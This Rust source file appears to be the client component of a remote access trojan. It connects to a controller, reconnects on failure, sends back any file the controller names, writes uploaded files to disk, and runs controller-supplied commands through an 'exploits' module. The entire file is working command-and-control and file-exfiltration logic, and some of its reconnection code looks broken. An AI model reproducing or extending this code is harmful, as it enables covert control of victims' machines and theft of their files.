use crate::exploits::{Exploits, HandleExploits};
use crate::structure::{Detector, StructStone, StructStoneHeader, StructStonePayload};
use bstr::ByteSlice;
use std::{
    env,
    fs::File,
    io::{Read, Write},
    net::Shutdown,
    net::TcpStream,
    thread,
    time::Duration,
    u8,
};

#[derive(Debug)]
pub struct HandleSession {
    socket: TcpStream,
    packet: StructStone,
    exploits: Exploits,
}

impl HandleSession {
    pub fn new(ip_port: String, exploits: Exploits) -> HandleSession {
        if let Ok(mut socket) = TcpStream::connect(ip_port.clone()) {
            let packet = StructStone::connection();
            socket
                .write_all(&packet.get_stone())
                .expect("TODO: panic message");
            HandleSession {
                socket,
                packet,
                exploits,
            }
        } else {
            Self::new(ip_port, exploits)
        }
    }

    pub fn HandleConnectionLoss(&self) {
        self.socket.shutdown(Shutdown::Both).ok();
        loop {
            println!("HandleConnectionLoss");
            if let Ok(mut socket) =
                TcpStream::connect(self.socket.local_addr().unwrap().ip().to_string())
            {
                match socket.write_all(self.packet.get_stone()) {
                    Ok(_) => break,
                    Err(_) => continue,
                }
            }
            thread::sleep(Duration::from_micros(1000))
        }
    }

    pub fn get_packet(&self) -> StructStone {
        self.packet.clone()
    }
}

pub trait Client {
    fn send(&mut self) -> Result<(), ()>;
    fn send_msg(&mut self, msg: &str) -> Result<(), ()>;
    fn disconnect(&mut self);
    fn recv(&mut self, buffer_size: usize) -> Vec<u8>;
    fn receiving(&mut self, buffer: StructStone) -> StructStone;
    fn download(&mut self) -> Result<(), ()>;
    fn upload(&mut self) -> Result<(), ()>;
    fn exploit(&mut self) -> Result<(), ()>;
}

impl Client for HandleSession {
    fn send(&mut self) -> Result<(), ()> {
        match self.socket.write_all(self.packet.get_stone()) {
            Ok(_) => Ok(()),
            Err(_) => Err(()),
        }
    }

    fn send_msg(&mut self, msg: &str) -> Result<(), ()> {
        self.packet = StructStone::response(msg);
        self.send()
    }

    fn disconnect(&mut self) {
        self.packet = StructStone::disconnect();
        self.send().unwrap();
        self.socket
            .shutdown(Shutdown::Both)
            .expect("TODO: panic message");
    }

    fn recv(&mut self, buffer_size: usize) -> Vec<u8> {
        let mut buffer: Vec<u8> = vec![0; buffer_size];

        match self.socket.read_exact(&mut buffer) {
            Ok(_) => buffer_size,
            Err(_) => buffer_size,
        };

        buffer
    }

    fn receiving(&mut self, buffer: StructStone) -> StructStone {
        // 함수가 재귀적으로 호출돠기 때문에 빈 헤더, 페이로드를 입력받음, 기본 헤더의 페이로드 크기는 12바이트 고정임
        let mut payload = StructStonePayload::default(); // 응답을 받을 빈 페이로드 구조체 생성
        let buffer_size = buffer.get_size();

        if buffer_size != 12 {
            // 만약 수신받은 데이터의 크기가 12 바이트가 아니라면
            payload = StructStonePayload::from(self.recv(buffer_size)); // 페이로드 크기만큼 데이터를 받고 구조체로 변환하여 빈 페이로드 구조체에 저장
            self.packet = StructStone::build(buffer.get_header(), payload);
            return self.packet.clone();
        }

        let header = StructStoneHeader::deserialization(self.recv(12)); //만함수 인자로 입력받은 헤더의 페이로드 크기가 12바이트 (기본 헤더 ) 라면 새로운 헤더 (12바이트 고정)을 수신받고
        return self.receiving(StructStone::build(header, payload)); // 새로운 헤더를 재귀함수로 입력함 이 경우 재귀함수에서 if buffer.header.stone_size != vec![12,0,0,0] 문에 걸려서 페이로드를 수신받게 됨
    }

    fn download(&mut self) -> Result<(), ()> {
        let path = match String::from_utf8(self.packet.get_file()) {
            Ok(ok) => ok,
            Err(_) => return self.send_msg("File Not Found"),
        };

        let mut open_file = match File::open(path.replace("\\", "/")) {
            Ok(file) => file,
            Err(_) => return self.send_msg("File Not Found"),
        };
        let mut file = vec![];

        match open_file.read_to_end(&mut file) {
            Ok(ok) => ok.to_le_bytes().to_vec(),
            Err(_) => return self.send_msg("File Not Found"),
        };
        self.packet = StructStone::download(file);
        self.send()
    }
    fn upload(&mut self) -> Result<(), ()> {
        let file_arr: &[u8] = &self.packet.get_file()[..];
        let mut fields: Vec<&[u8]> = file_arr.split_str("<name_end>").collect();

        let path = format!(
            "{:?}/{:?}",
            env::current_dir().unwrap(),
            String::from_utf8(Vec::from(fields[0])).unwrap()
        )
        .replace('"', "")
        .replace("\\", "/");

        let mut open_file = match File::create(path.clone()) {
            Ok(ok) => ok,
            Err(_) => return self.send_msg("File Not Found"),
        };

        let file = match open_file.write_all(&mut fields[1]) {
            Ok(_) => format!("File {:?} upload successful", path)
                .as_bytes()
                .to_vec(),
            Err(_) => return self.send_msg("File Not Found"),
        };

        self.packet = StructStone::upload(file);
        self.send()
    }

    fn exploit(&mut self) -> Result<(), ()> {
        self.packet = StructStone::exploit(self.exploits.command(self.get_packet().get_command()));
        self.send()
    }
}
